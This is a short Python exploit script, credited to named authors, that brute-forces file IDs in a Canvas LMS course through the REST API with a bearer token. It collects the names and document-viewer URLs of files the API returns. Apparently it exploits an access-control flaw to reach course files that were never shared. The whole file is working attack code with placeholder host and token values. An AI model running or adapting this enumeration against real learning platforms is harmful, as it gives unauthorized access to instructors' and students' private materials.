#!/usr/bin/env python3

# Author: Gaukas Wang <Gaukas.Wang@colorado.edu>
# Original Exploit Reported By: Aaron(Yinghao) Li <yl4579@columbia.edu>

import requests
from time import sleep
from requests.structures import CaseInsensitiveDict

BASE_DOMAIN = "https://canvas.example.com"
COURSE_ID = "70738"
LATEST_FILE_ID = 32554662
MAX_ATTEMPT = 20000

base_url = BASE_DOMAIN+"/api/v1/courses/"+COURSE_ID+"/files/"

headers = CaseInsensitiveDict()
headers["Accept"] = "application/json"
headers["Authorization"] = "Bearer YOUR_TOKEN_HERE"
file_list = []

for i in range(MAX_ATTEMPT):
    # sleep(0.01)
    target_url = base_url + str(LATEST_FILE_ID-i-1)
    resp = requests.get(target_url, headers=headers)
    try:
        json_resp = resp.json()
        if 'canvadoc_session_url' in json_resp:
            found_file = {'id': json_resp['id'], 'filename': json_resp['filename'], 'url': BASE_DOMAIN+json_resp['canvadoc_session_url']}
            file_list.append(found_file)
            print("Found 1 file with FileID %d\n" % json_resp['id'])
    except:
        continue # Don't care

print("===== FINAL RESULT =====")
print(file_list)
